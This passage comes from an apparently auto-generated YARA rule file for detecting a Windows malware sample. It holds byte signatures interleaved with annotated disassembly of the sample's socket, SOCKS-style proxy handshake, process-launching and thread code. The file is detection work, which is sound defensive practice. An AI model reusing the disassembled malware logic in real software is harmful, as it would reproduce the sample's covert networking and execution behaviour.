        $c19 = { 8B 94 24 ?? ?? ?? ?? 6A 00 6A 00 6A 02 6A 00 6A 00 68 00 00 00 40 52 FF 15 ?? ?? ?? ?? 8B E8 B0 49 B1 4E 88 44 24 ?? 88 44 24 ?? 88 44 24 ?? 88 4C 24 ?? 88 4C 24 ?? B0 6E B1 64 88 44 24 ?? 88 44 24 ?? 88 4C 24 ?? 88 4C 24 ?? 8D 44 24 ?? 8D 4C 24 ?? 50 51 C6 44 24 ?? 57 C6 44 24 ?? 45 C6 44 24 ?? 54 C6 44 24 ?? 2E 88 5C 24 ?? 88 5C 24 ?? C6 44 24 ?? 00 C6 44 24 ?? 74 C6 44 24 ?? 65 C6 44 24 ?? 72 C6 44 24 ?? 65 C6 44 24 ?? 74 C6 44 24 ?? 52 C6 44 24 ?? 65 C6 44 24 ?? 61 C6 44 24 ?? 46 C6 44 24 ?? 69 88 5C 24 ?? C6 44 24 ?? 65 C6 44 24 ?? 00 FF 15 ?? ?? ?? ?? 50 FF 15 ?? ?? ?? ?? 83 FD FF 8B D8 74 ?? }
        /*
Basic Block at 0x00401867@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - create TCP socket
        .text:0x00401867  loc_00401867: [3 XREFS]
        .text:0x00401867  6a06             push 6
        .text:0x00401869  6a01             push 1
        .text:0x0040186b  6a02             push 2
        .text:0x0040186d  ff1500924000     call dword [0x00409200]    ;ws2_32.socket(2,1,6)
        .text:0x00401873  83f8ff           cmp eax,0xffffffff
        .text:0x00401876  8986a8000000     mov dword [esi + 168],eax
        .text:0x0040187c  750b             jnz 0x00401889
        */
        $c20 = { 6A 06 6A 01 6A 02 FF 15 ?? ?? ?? ?? 83 F8 FF 89 86 ?? ?? ?? ?? 75 ?? }
        /*
Basic Block at 0x00402a71@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - get file attributes
        .text:0x00402a71  8b4c246c         mov ecx,dword [esp + 108]
        .text:0x00402a75  51               push ecx
        .text:0x00402a76  e8d5feffff       call 0x00402950    ;sub_00402950(0,0,arg1,arg1)
        .text:0x00402a7b  83c404           add esp,4
        .text:0x00402a7e  55               push ebp
        .text:0x00402a7f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00402a81  68b8a84000       push 0x0040a8b8
        .text:0x00402a86  ff15bc904000     call dword [0x004090bc]    ;kernel32.GetFileAttributesA(0x0040a8b8)
        .text:0x00402a8c  83f8ff           cmp eax,0xffffffff
        .text:0x00402a8f  7475             jz 0x00402b06
        */
        $c21 = { 8B 4C 24 ?? 51 E8 ?? ?? ?? ?? 83 C4 04 55 FF D6 68 B8 A8 40 00 FF 15 ?? ?? ?? ?? 83 F8 FF 74 ?? }
        /*
Basic Block at 0x00403b43@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - get file attributes
        .text:0x00403b43  6a00             push 0
        .text:0x00403b45  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403b47  8d4c2454         lea ecx,dword [esp + 84]
        .text:0x00403b4b  c64424086f       mov byte [esp + 8],111
        .text:0x00403b50  51               push ecx
        .text:0x00403b51  c644240d70       mov byte [esp + 13],112
        .text:0x00403b56  c644240e65       mov byte [esp + 14],101
        .text:0x00403b5b  c644240f6e       mov byte [esp + 15],110
        .text:0x00403b60  c644241000       mov byte [esp + 16],0
        .text:0x00403b65  ff15bc904000     call dword [0x004090bc]    ;kernel32.GetFileAttributesA(local260)
        .text:0x00403b6b  83f8ff           cmp eax,0xffffffff
        .text:0x00403b6e  7420             jz 0x00403b90
        */
        $c22 = { 6A 00 FF D6 8D 4C 24 ?? C6 44 24 ?? 6F 51 C6 44 24 ?? 70 C6 44 24 ?? 65 C6 44 24 ?? 6E C6 44 24 ?? 00 FF 15 ?? ?? ?? ?? 83 F8 FF 74 ?? }
        /*
Basic Block at 0x00403b70@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - create process on Windows
        .text:0x00403b70  6a00             push 0
        .text:0x00403b72  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403b74  6a05             push 5
        .text:0x00403b76  6a00             push 0
        .text:0x00403b78  8d54245c         lea edx,dword [esp + 92]
        .text:0x00403b7c  6a00             push 0
        .text:0x00403b7e  8d442414         lea eax,dword [esp + 20]
        .text:0x00403b82  52               push edx
        .text:0x00403b83  50               push eax
        .text:0x00403b84  6a00             push 0
        .text:0x00403b86  ff15ac914000     call dword [0x004091ac]    ;shell32.ShellExecuteA(0,local336,local260,0,0,5)
        .text:0x00403b8c  6a00             push 0
        .text:0x00403b8e  ffd6             call esi    ;kernel32.Sleep(0)
        */
        $c23 = { 6A 00 FF D6 6A 05 6A 00 8D 54 24 ?? 6A 00 8D 44 24 ?? 52 50 6A 00 FF 15 ?? ?? ?? ?? 6A 00 FF D6 }
        /*
Basic Block at 0x0040728d@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - create process on Windows
        .text:0x0040728d  6a00             push 0
        .text:0x0040728f  c745f400000000   mov dword [ebp - 12],0
        .text:0x00407296  c645dc6f         mov byte [ebp - 36],111
        .text:0x0040729a  c645dd70         mov byte [ebp - 35],112
        .text:0x0040729e  c645de65         mov byte [ebp - 34],101
        .text:0x004072a2  c645df6e         mov byte [ebp - 33],110
        .text:0x004072a6  c645e000         mov byte [ebp - 32],0
        .text:0x004072aa  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004072ac  6a05             push 5
        .text:0x004072ae  6a00             push 0
        .text:0x004072b0  8d95b0fdffff     lea edx,dword [ebp - 592]
        .text:0x004072b6  6a00             push 0
        .text:0x004072b8  8d45dc           lea eax,dword [ebp - 36]
        .text:0x004072bb  52               push edx
        .text:0x004072bc  50               push eax
        .text:0x004072bd  6a00             push 0
        .text:0x004072bf  ffd7             call edi    ;shell32.ShellExecuteA(0,local40,local596,0,0,5)
        .text:0x004072c1  6a00             push 0
        .text:0x004072c3  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004072c5  43               inc ebx
        .text:0x004072c6  83fb03           cmp ebx,3
        .text:0x004072c9  7335             jnc 0x00407300
        */
        $c24 = { 6A 00 C7 45 ?? 00 00 00 00 C6 45 ?? 6F C6 45 ?? 70 C6 45 ?? 65 C6 45 ?? 6E C6 45 ?? 00 FF D6 6A 05 6A 00 8D 95 ?? ?? ?? ?? 6A 00 8D 45 ?? 52 50 6A 00 FF D7 6A 00 FF D6 43 83 FB 03 73 ?? }
        /*
Basic Block at 0x004078e0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - create thread
        .text:0x004078e0  
        .text:0x004078e0  FUNC: int cdecl sub_004078e0( int arg0, int arg1, int arg2, int arg3, int arg4, int arg5, int arg6, ) [10 XREFS] 
        .text:0x004078e0  
        .text:0x004078e0  Stack Variables: (offset from initial top of stack)
        .text:0x004078e0            28: int arg6
        .text:0x004078e0            24: int arg5
        .text:0x004078e0            20: int arg4
        .text:0x004078e0            16: int arg3
        .text:0x004078e0            12: int arg2
        .text:0x004078e0             8: int arg1
        .text:0x004078e0             4: int arg0
        .text:0x004078e0            -4: int local4
        .text:0x004078e0            -8: int local8
        .text:0x004078e0           -12: int local12
        .text:0x004078e0           -16: int local16
        .text:0x004078e0  
        .text:0x004078e0  83ec10           sub esp,16
        .text:0x004078e3  8b44241c         mov eax,dword [esp + 28]
        .text:0x004078e7  8b4c2420         mov ecx,dword [esp + 32]
        .text:0x004078eb  8a54242c         mov dl,byte [esp + 44]
        .text:0x004078ef  56               push esi
        .text:0x004078f0  8b3578904000     mov esi,dword [0x00409078]
        .text:0x004078f6  6a00             push 0
        .text:0x004078f8  89442408         mov dword [esp + 8],eax
        .text:0x004078fc  894c240c         mov dword [esp + 12],ecx
        .text:0x00407900  88542410         mov byte [esp + 16],dl
        .text:0x00407904  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407906  6a00             push 0
        .text:0x00407908  6a00             push 0
        .text:0x0040790a  6a00             push 0
        .text:0x0040790c  6a00             push 0
        .text:0x0040790e  ff1584904000     call dword [0x00409084]    ;kernel32.CreateEventA(0,0,0,0)
        .text:0x00407914  6a00             push 0
        .text:0x00407916  89442414         mov dword [esp + 20],eax
        .text:0x0040791a  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040791c  8b4c2428         mov ecx,dword [esp + 40]
        .text:0x00407920  8d442430         lea eax,dword [esp + 48]
        .text:0x00407924  50               push eax
        .text:0x00407925  8b442420         mov eax,dword [esp + 32]
        .text:0x00407929  8d542408         lea edx,dword [esp + 8]
        .text:0x0040792d  51               push ecx
        .text:0x0040792e  8b4c2420         mov ecx,dword [esp + 32]
        .text:0x00407932  52               push edx
        .text:0x00407933  6890784000       push 0x00407890
        .text:0x00407938  50               push eax
        .text:0x00407939  51               push ecx
        .text:0x0040793a  e88d050000       call 0x00407ecc    ;msvcrt._beginthreadex(arg0,arg1,0x00407890,local16,arg4,arg6)
        .text:0x0040793f  8b542428         mov edx,dword [esp + 40]
        .text:0x00407943  83c418           add esp,24
        .text:0x00407946  8bf0             mov esi,eax
        .text:0x00407948  6aff             push 0xffffffff
        .text:0x0040794a  52               push edx
        .text:0x0040794b  ff158c904000     call dword [0x0040908c]    ;kernel32.WaitForSingleObject(kernel32.CreateEventA(0,0,0,0),0xffffffff)
        .text:0x00407951  8b442410         mov eax,dword [esp + 16]
        .text:0x00407955  50               push eax
        .text:0x00407956  ff1588904000     call dword [0x00409088]    ;kernel32.CloseHandle(<0x0040790e>)
        .text:0x0040795c  8bc6             mov eax,esi
        .text:0x0040795e  5e               pop esi
        .text:0x0040795f  83c410           add esp,16
        .text:0x00407962  c3               ret 
        */
        $c25 = { 83 EC 10 8B 44 24 ?? 8B 4C 24 ?? 8A 54 24 ?? 56 8B 35 ?? ?? ?? ?? 6A 00 89 44 24 ?? 89 4C 24 ?? 88 54 24 ?? FF D6 6A 00 6A 00 6A 00 6A 00 FF 15 ?? ?? ?? ?? 6A 00 89 44 24 ?? FF D6 8B 4C 24 ?? 8D 44 24 ?? 50 8B 44 24 ?? 8D 54 24 ?? 51 8B 4C 24 ?? 52 68 90 78 40 00 50 51 E8 ?? ?? ?? ?? 8B 54 24 ?? 83 C4 18 8B F0 6A FF 52 FF 15 ?? ?? ?? ?? 8B 44 24 ?? 50 FF 15 ?? ?? ?? ?? 8B C6 5E 83 C4 10 C3 }
        /*
Basic Block at 0x00403685@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - terminate thread
        .text:0x00403685  loc_00403685: [1 XREFS]
        .text:0x00403685  6a00             push 0
        .text:0x00403687  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403689  8b07             mov eax,dword [edi]
        .text:0x0040368b  6aff             push 0xffffffff
        .text:0x0040368d  50               push eax
        .text:0x0040368e  ff15c8904000     call dword [0x004090c8]    ;kernel32.TerminateThread(0x61616161,0xffffffff)
        .text:0x00403694  6a00             push 0
        .text:0x00403696  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403698  8b0f             mov ecx,dword [edi]
        .text:0x0040369a  51               push ecx
        .text:0x0040369b  ff1588904000     call dword [0x00409088]    ;kernel32.CloseHandle(0x61616161)
        .text:0x004036a1  6a00             push 0
        .text:0x004036a3  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004036a5  8b85549f0000     mov eax,dword [ebp + 40788]
        .text:0x004036ab  43               inc ebx
        .text:0x004036ac  83c704           add edi,4
        .text:0x004036af  3bd8             cmp ebx,eax
        .text:0x004036b1  72d2             jc 0x00403685
        */
        $c26 = { 6A 00 FF D6 8B 07 6A FF 50 FF 15 ?? ?? ?? ?? 6A 00 FF D6 8B 0F 51 FF 15 ?? ?? ?? ?? 6A 00 FF D6 8B 85 ?? ?? ?? ?? 43 83 C7 04 3B D8 72 ?? }
        /*
function at 0x004019c0@9324d1a8ae37a36ae560c37448c9705a with 6 features:
          - get socket status
          - receive data
          - receive data on socket
          - resolve DNS
          - send data
          - send data on socket
        .text:0x004019c0  
        .text:0x004019c0  FUNC: int stdcall sub_004019c0( int arg0, int arg1, ) [2 XREFS] 
        .text:0x004019c0  
        .text:0x004019c0  Stack Variables: (offset from initial top of stack)
        .text:0x004019c0             8: int arg1
        .text:0x004019c0             4: int arg0
        .text:0x004019c0          -600: int local600
        .text:0x004019c0          -603: int local603
        .text:0x004019c0          -604: int local604
        .text:0x004019c0          -607: int local607
        .text:0x004019c0          -608: int local608
        .text:0x004019c0          -862: int local862
        .text:0x004019c0          -863: int local863
        .text:0x004019c0          -864: int local864
        .text:0x004019c0          -1116: int local1116
        .text:0x004019c0          -1120: int local1120
        .text:0x004019c0          -1124: int local1124
        .text:0x004019c0          -1128: int local1128
        .text:0x004019c0          -1132: int local1132
        .text:0x004019c0          -1133: int local1133
        .text:0x004019c0          -1134: int local1134
        .text:0x004019c0          -1135: int local1135
        .text:0x004019c0          -1136: int local1136
        .text:0x004019c0          -1140: int local1140
        .text:0x004019c0          -1144: int local1144
        .text:0x004019c0          -1145: int local1145
        .text:0x004019c0          -1146: int local1146
        .text:0x004019c0          -1147: int local1147
        .text:0x004019c0          -1148: int local1148
        .text:0x004019c0  
        .text:0x004019c0  81ec7c040000     sub esp,1148
        .text:0x004019c6  53               push ebx
        .text:0x004019c7  55               push ebp
        .text:0x004019c8  8b2d14924000     mov ebp,dword [0x00409214]
        .text:0x004019ce  56               push esi
        .text:0x004019cf  8bf1             mov esi,ecx
        .text:0x004019d1  57               push edi
        .text:0x004019d2  6a00             push 0
        .text:0x004019d4  8d442414         lea eax,dword [esp + 20]
        .text:0x004019d8  8b8ea8000000     mov ecx,dword [esi + 168]
        .text:0x004019de  6a04             push 4
        .text:0x004019e0  b302             mov bl,2
        .text:0x004019e2  50               push eax
        .text:0x004019e3  51               push ecx
        .text:0x004019e4  c744242803000000 mov dword [esp + 40],3
        .text:0x004019ec  c744242c00000000 mov dword [esp + 44],0
        .text:0x004019f4  c644242005       mov byte [esp + 32],5
        .text:0x004019f9  885c2421         mov byte [esp + 33],bl
        .text:0x004019fd  c644242200       mov byte [esp + 34],0
        .text:0x00401a02  885c2423         mov byte [esp + 35],bl
        .text:0x00401a06  ffd5             call ebp    ;ws2_32.send(0x61616161,local1148,4,0)
        .text:0x00401a08  b996000000       mov ecx,150
        .text:0x00401a0d  33c0             xor eax,eax
        .text:0x00401a0f  8dbc2434020000   lea edi,dword [esp + 564]
        .text:0x00401a16  8b96a8000000     mov edx,dword [esi + 168]
        .text:0x00401a1c  f3ab             rep: stosd 
        .text:0x00401a1e  8d442418         lea eax,dword [esp + 24]
        .text:0x00401a22  8d4c242c         lea ecx,dword [esp + 44]
        .text:0x00401a26  50               push eax
        .text:0x00401a27  6a00             push 0
        .text:0x00401a29  6a00             push 0
        .text:0x00401a2b  51               push ecx
        .text:0x00401a2c  6a00             push 0
        .text:0x00401a2e  89542444         mov dword [esp + 68],edx
        .text:0x00401a32  c744244001000000 mov dword [esp + 64],1
        .text:0x00401a3a  ff1510924000     call dword [0x00409210]    ;ws2_32.select(0,local1120,0,0,local1140)
        .text:0x00401a40  85c0             test eax,eax
        .text:0x00401a42  7f0c             jg 0x00401a50
        .text:0x00401a44  8b96a8000000     mov edx,dword [esi + 168]
        .text:0x00401a4a  52               push edx
        .text:0x00401a4b  e95d020000       jmp 0x00401cad
        .text:0x00401a50  loc_00401a50: [1 XREFS]
        .text:0x00401a50  8b8ea8000000     mov ecx,dword [esi + 168]
        .text:0x00401a56  6a00             push 0
        .text:0x00401a58  8d842438020000   lea eax,dword [esp + 568]
        .text:0x00401a5f  6858020000       push 600
        .text:0x00401a64  50               push eax
        .text:0x00401a65  51               push ecx
        .text:0x00401a66  ff150c924000     call dword [0x0040920c]    ;ws2_32.recv(0x61616161,local600,600)
        .text:0x00401a6c  80bc243402000005 cmp byte [esp + 564],5
        .text:0x00401a74  0f852c020000     jnz 0x00401ca6
        .text:0x00401a7a  8a842435020000   mov al,byte [esp + 565]
        .text:0x00401a81  84c0             test al,al
        .text:0x00401a83  740a             jz 0x00401a8f
        .text:0x00401a85  3ac3             cmp al,bl
        .text:0x00401a87  0f8519020000     jnz 0x00401ca6
        .text:0x00401a8d  eb08             jmp 0x00401a97
        .text:0x00401a8f  loc_00401a8f: [1 XREFS]
        .text:0x00401a8f  3ac3             cmp al,bl
        .text:0x00401a91  0f8530010000     jnz 0x00401bc7
        .text:0x00401a97  loc_00401a97: [1 XREFS]
        .text:0x00401a97  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00401a9d  68a0a54000       push 0x0040a5a0
        .text:0x00401aa2  e8492c0000       call 0x004046f0    ;sub_004046f0(0x0040a5a0)
        .text:0x00401aa7  85c0             test eax,eax
        .text:0x00401aa9  0f8618010000     jbe 0x00401bc7
        .text:0x00401aaf  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00401ab5  68a0a54000       push 0x0040a5a0
        .text:0x00401aba  e8312c0000       call 0x004046f0    ;sub_004046f0(0x0040a5a0)
        .text:0x00401abf  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00401ac5  68a0a64000       push 0x0040a6a0
        .text:0x00401aca  8bd8             mov ebx,eax
        .text:0x00401acc  e81f2c0000       call 0x004046f0    ;sub_004046f0(0x0040a6a0)
        .text:0x00401ad1  89442414         mov dword [esp + 20],eax
        .text:0x00401ad5  b940000000       mov ecx,64
        .text:0x00401ada  33c0             xor eax,eax
        .text:0x00401adc  8dbc2430010000   lea edi,dword [esp + 304]
        .text:0x00401ae3  f3ab             rep: stosd 
        .text:0x00401ae5  66ab             stosd 
        .text:0x00401ae7  8b3d94904000     mov edi,dword [0x00409094]
        .text:0x00401aed  8d942432010000   lea edx,dword [esp + 306]
        .text:0x00401af4  68a0a54000       push 0x0040a5a0
        .text:0x00401af9  52               push edx
        .text:0x00401afa  c684243801000005 mov byte [esp + 312],5
        .text:0x00401b02  889c2439010000   mov byte [esp + 313],bl
        .text:0x00401b09  ffd7             call edi    ;kernel32.lstrcpyA(local862,0x0040a5a0)
        .text:0x00401b0b  8d442414         lea eax,dword [esp + 20]
        .text:0x00401b0f  6a04             push 4
        .text:0x00401b11  8d8c1c36010000   lea ecx,dword [esp + ebx + 310]
        .text:0x00401b18  50               push eax
        .text:0x00401b19  51               push ecx
        .text:0x00401b1a  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00401b20  e83b2a0000       call 0x00404560    ;sub_00404560(0x010c2c61,local1148,4)
        .text:0x00401b25  8d941c33010000   lea edx,dword [esp + ebx + 307]
        .text:0x00401b2c  68a0a64000       push 0x0040a6a0
        .text:0x00401b31  52               push edx
        .text:0x00401b32  ffd7             call edi    ;kernel32.lstrcpyA(0x010c2c62,0x0040a6a0)
        .text:0x00401b34  8b442414         mov eax,dword [esp + 20]
        .text:0x00401b38  6a00             push 0
        .text:0x00401b3a  8d942434010000   lea edx,dword [esp + 308]
        .text:0x00401b41  8d4c1803         lea ecx,dword [eax + ebx + 3]
        .text:0x00401b45  8b86a8000000     mov eax,dword [esi + 168]
        .text:0x00401b4b  51               push ecx
        .text:0x00401b4c  52               push edx
        .text:0x00401b4d  50               push eax
        .text:0x00401b4e  ffd5             call ebp    ;ws2_32.send(0x61616161,local864,0x82b78021,0)
        .text:0x00401b50  8d542418         lea edx,dword [esp + 24]
        .text:0x00401b54  33c0             xor eax,eax
        .text:0x00401b56  b996000000       mov ecx,150
        .text:0x00401b5b  8dbc2434020000   lea edi,dword [esp + 564]
        .text:0x00401b62  52               push edx
        .text:0x00401b63  50               push eax
        .text:0x00401b64  f3ab             rep: stosd 
        .text:0x00401b66  8b8ea8000000     mov ecx,dword [esi + 168]
        .text:0x00401b6c  50               push eax
        .text:0x00401b6d  8d442438         lea eax,dword [esp + 56]
        .text:0x00401b71  894c243c         mov dword [esp + 60],ecx
        .text:0x00401b75  50               push eax
        .text:0x00401b76  6a00             push 0
        .text:0x00401b78  c744244001000000 mov dword [esp + 64],1
        .text:0x00401b80  ff1510924000     call dword [0x00409210]    ;ws2_32.select(0,local1124,0,0,local1144)
        .text:0x00401b86  85c0             test eax,eax
        .text:0x00401b88  0f8e18010000     jle 0x00401ca6
        .text:0x00401b8e  8b86a8000000     mov eax,dword [esi + 168]
        .text:0x00401b94  6a00             push 0
        .text:0x00401b96  8d942438020000   lea edx,dword [esp + 568]
        .text:0x00401b9d  6858020000       push 600
        .text:0x00401ba2  52               push edx
        .text:0x00401ba3  50               push eax
        .text:0x00401ba4  ff150c924000     call dword [0x0040920c]    ;ws2_32.recv(0x61616161,local604,600)
        .text:0x00401baa  80bc243402000005 cmp byte [esp + 564],5
        .text:0x00401bb2  0f85ee000000     jnz 0x00401ca6
        .text:0x00401bb8  8a842435020000   mov al,byte [esp + 565]
        .text:0x00401bbf  84c0             test al,al
        .text:0x00401bc1  0f85df000000     jnz 0x00401ca6
        .text:0x00401bc7  loc_00401bc7: [2 XREFS]
        .text:0x00401bc7  8b942490040000   mov edx,dword [esp + 1168]
        .text:0x00401bce  52               push edx
        .text:0x00401bcf  ff15fc914000     call dword [0x004091fc]    ;ws2_32.gethostbyname(sp+0)
        .text:0x00401bd5  85c0             test eax,eax
        .text:0x00401bd7  0f84d6000000     jz 0x00401cb3
        .text:0x00401bdd  c644242005       mov byte [esp + 32],5
        .text:0x00401be2  c644242101       mov byte [esp + 33],1
        .text:0x00401be7  c644242200       mov byte [esp + 34],0
        .text:0x00401bec  c644242301       mov byte [esp + 35],1
        .text:0x00401bf1  8b400c           mov eax,dword [eax + 12]
        .text:0x00401bf4  8b08             mov ecx,dword [eax]
        .text:0x00401bf6  8b842494040000   mov eax,dword [esp + 1172]
        .text:0x00401bfd  50               push eax
        .text:0x00401bfe  8b11             mov edx,dword [ecx]
        .text:0x00401c00  89542428         mov dword [esp + 40],edx
        .text:0x00401c04  ff1508924000     call dword [0x00409208]    ;ws2_32.ntohs(arg0)
        .text:0x00401c0a  8b96a8000000     mov edx,dword [esi + 168]
        .text:0x00401c10  6a00             push 0
        .text:0x00401c12  8d4c2424         lea ecx,dword [esp + 36]
        .text:0x00401c16  6a0a             push 10
        .text:0x00401c18  51               push ecx
        .text:0x00401c19  52               push edx
        .text:0x00401c1a  6689442438       mov word [esp + 56],ax
        .text:0x00401c1f  ffd5             call ebp    ;ws2_32.send(0x61616161,local1136,10,0)
        .text:0x00401c21  b996000000       mov ecx,150
        .text:0x00401c26  33c0             xor eax,eax
        .text:0x00401c28  8dbc2434020000   lea edi,dword [esp + 564]
        .text:0x00401c2f  8d54242c         lea edx,dword [esp + 44]
        .text:0x00401c33  f3ab             rep: stosd 
        .text:0x00401c35  8b86a8000000     mov eax,dword [esi + 168]
        .text:0x00401c3b  8d4c2418         lea ecx,dword [esp + 24]
        .text:0x00401c3f  51               push ecx
        .text:0x00401c40  6a00             push 0
        .text:0x00401c42  6a00             push 0
        .text:0x00401c44  52               push edx
        .text:0x00401c45  6a00             push 0
        .text:0x00401c47  89442444         mov dword [esp + 68],eax
        .text:0x00401c4b  c744244001000000 mov dword [esp + 64],1
        .text:0x00401c53  ff1510924000     call dword [0x00409210]    ;ws2_32.select(0,local1124,0,0,local1144)
        .text:0x00401c59  85c0             test eax,eax
        .text:0x00401c5b  7f09             jg 0x00401c66
        .text:0x00401c5d  loc_00401c5d: [2 XREFS]
        .text:0x00401c5d  8b86a8000000     mov eax,dword [esi + 168]
        .text:0x00401c63  50               push eax
        .text:0x00401c64  eb47             jmp 0x00401cad
        .text:0x00401c66  loc_00401c66: [1 XREFS]
        .text:0x00401c66  8b96a8000000     mov edx,dword [esi + 168]
        .text:0x00401c6c  6a00             push 0
        .text:0x00401c6e  8d8c2438020000   lea ecx,dword [esp + 568]
        .text:0x00401c75  6858020000       push 600
        .text:0x00401c7a  51               push ecx
        .text:0x00401c7b  52               push edx
        .text:0x00401c7c  ff150c924000     call dword [0x0040920c]    ;ws2_32.recv(0x61616161,local604,600)
        .text:0x00401c82  80bc243402000005 cmp byte [esp + 564],5
        .text:0x00401c8a  75d1             jnz 0x00401c5d
        .text:0x00401c8c  8a842435020000   mov al,byte [esp + 565]
        .text:0x00401c93  84c0             test al,al
        .text:0x00401c95  75c6             jnz 0x00401c5d
        .text:0x00401c97  5f               pop edi
        .text:0x00401c98  5e               pop esi
        .text:0x00401c99  5d               pop ebp
        .text:0x00401c9a  b001             mov al,1
        .text:0x00401c9c  5b               pop ebx
        .text:0x00401c9d  81c47c040000     add esp,1148
        .text:0x00401ca3  c20800           ret 8
        .text:0x00401ca6  loc_00401ca6: [5 XREFS]
        .text:0x00401ca6  8b8ea8000000     mov ecx,dword [esi + 168]
        .text:0x00401cac  51               push ecx
        .text:0x00401cad  loc_00401cad: [2 XREFS]
        .text:0x00401cad  ff1504924000     call dword [0x00409204]    ;ws2_32.closesocket(0x61616161)
        .text:0x00401cb3  loc_00401cb3: [1 XREFS]
        .text:0x00401cb3  5f               pop edi
        .text:0x00401cb4  5e               pop esi
        .text:0x00401cb5  5d               pop ebp
        .text:0x00401cb6  32c0             xor al,al
        .text:0x00401cb8  5b               pop ebx
        .text:0x00401cb9  81c47c040000     add esp,1148
        .text:0x00401cbf  c20800           ret 8
        */
        $c27 = { 81 EC 7C 04 00 00 53 55 8B 2D ?? ?? ?? ?? 56 8B F1 57 6A 00 8D 44 24 ?? 8B 8E ?? ?? ?? ?? 6A 04 B3 02 50 51 C7 44 24 ?? 03 00 00 00 C7 44 24 ?? 00 00 00 00 C6 44 24 ?? 05 88 5C 24 ?? C6 44 24 ?? 00 88 5C 24 ?? FF D5 B9 96 00 00 00 33 C0 8D BC 24 ?? ?? ?? ?? 8B 96 ?? ?? ?? ?? F3 AB 8D 44 24 ?? 8D 4C 24 ?? 50 6A 00 6A 00 51 6A 00 89 54 24 ?? C7 44 24 ?? 01 00 00 00 FF 15 ?? ?? ?? ?? 85 C0 7F ?? 8B 96 ?? ?? ?? ?? 52 E9 ?? ?? ?? ?? 8B 8E ?? ?? ?? ?? 6A 00 8D 84 24 ?? ?? ?? ?? 68 58 02 00 00 50 51 FF 15 ?? ?? ?? ?? 80 BC 24 ?? ?? ?? ?? 05 0F 85 ?? ?? ?? ?? 8A 84 24 ?? ?? ?? ?? 84 C0 74 ?? 3A C3 0F 85 ?? ?? ?? ?? EB ?? 3A C3 0F 85 ?? ?? ?? ?? 8B 0D ?? ?? ?? ?? 68 A0 A5 40 00 E8 ?? ?? ?? ?? 85 C0 0F 86 ?? ?? ?? ?? 8B 0D ?? ?? ?? ?? 68 A0 A5 40 00 E8 ?? ?? ?? ?? 8B 0D ?? ?? ?? ?? 68 A0 A6 40 00 8B D8 E8 ?? ?? ?? ?? 89 44 24 ?? B9 40 00 00 00 33 C0 8D BC 24 ?? ?? ?? ?? F3 AB 66 AB 8B 3D ?? ?? ?? ?? 8D 94 24 ?? ?? ?? ?? 68 A0 A5 40 00 52 C6 84 24 ?? ?? ?? ?? 05 88 9C 24 ?? ?? ?? ?? FF D7 8D 44 24 ?? 6A 04 8D 8C 1C ?? ?? ?? ?? 50 51 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 8D 94 1C ?? ?? ?? ?? 68 A0 A6 40 00 52 FF D7 8B 44 24 ?? 6A 00 8D 94 24 ?? ?? ?? ?? 8D 4C 18 ?? 8B 86 ?? ?? ?? ?? 51 52 50 FF D5 8D 54 24 ?? 33 C0 B9 96 00 00 00 8D BC 24 ?? ?? ?? ?? 52 50 F3 AB 8B 8E ?? ?? ?? ?? 50 8D 44 24 ?? 89 4C 24 ?? 50 6A 00 C7 44 24 ?? 01 00 00 00 FF 15 ?? ?? ?? ?? 85 C0 0F 8E ?? ?? ?? ?? 8B 86 ?? ?? ?? ?? 6A 00 8D 94 24 ?? ?? ?? ?? 68 58 02 00 00 52 50 FF 15 ?? ?? ?? ?? 80 BC 24 ?? ?? ?? ?? 05 0F 85 ?? ?? ?? ?? 8A 84 24 ?? ?? ?? ?? 84 C0 0F 85 ?? ?? ?? ?? 8B 94 24 ?? ?? ?? ?? 52 FF 15 ?? ?? ?? ?? 85 C0 0F 84 ?? ?? ?? ?? C6 44 24 ?? 05 C6 44 24 ?? 01 C6 44 24 ?? 00 C6 44 24 ?? 01 8B 40 ?? 8B 08 8B 84 24 ?? ?? ?? ?? 50 8B 11 89 54 24 ?? FF 15 ?? ?? ?? ?? 8B 96 ?? ?? ?? ?? 6A 00 8D 4C 24 ?? 6A 0A 51 52 66 89 44 24 ?? FF D5 B9 96 00 00 00 33 C0 8D BC 24 ?? ?? ?? ?? 8D 54 24 ?? F3 AB 8B 86 ?? ?? ?? ?? 8D 4C 24 ?? 51 6A 00 6A 00 52 6A 00 89 44 24 ?? C7 44 24 ?? 01 00 00 00 FF 15 ?? ?? ?? ?? 85 C0 7F ?? 8B 86 ?? ?? ?? ?? 50 EB ?? 8B 96 ?? ?? ?? ?? 6A 00 8D 8C 24 ?? ?? ?? ?? 68 58 02 00 00 51 52 FF 15 ?? ?? ?? ?? 80 BC 24 ?? ?? ?? ?? 05 75 ?? 8A 84 24 ?? ?? ?? ?? 84 C0 75 ?? 5F 5E 5D B0 01 5B 81 C4 7C 04 00 00 C2 08 00 8B 8E ?? ?? ?? ?? 51 FF 15 ?? ?? ?? ?? 5F 5E 5D 32 C0 5B 81 C4 7C 04 00 00 C2 08 00 }
        /*
function at 0x00401cd0@9324d1a8ae37a36ae560c37448c9705a with 3 features:
          - get socket status
          - receive data
          - receive data on socket
        .text:0x00401cd0  
        .text:0x00401cd0  FUNC: int stdcall sub_00401cd0( int arg0, ) [1 XREFS] 
        .text:0x00401cd0  
        .text:0x00401cd0  Stack Variables: (offset from initial top of stack)
        .text:0x00401cd0             4: int arg0
        .text:0x00401cd0            -8: int local8
